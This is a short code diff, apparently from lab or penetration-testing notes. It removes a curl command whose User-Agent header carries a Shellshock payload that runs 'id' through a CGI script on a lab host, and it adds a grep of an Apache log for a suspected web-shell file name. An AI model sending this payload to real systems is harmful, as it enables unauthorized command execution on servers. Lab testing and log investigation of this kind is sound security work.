@@ -1,3 +1,2 @@
-curl -i --max-time 15 \
-  -A '() { :; }; /bin/bash -c "id"' \
-  http://juice.kt66.lab/cgi-bin/test.cgi
+grep -n -F 'book07-shell.php' \
+  /var/log/apache2/landing_access.log
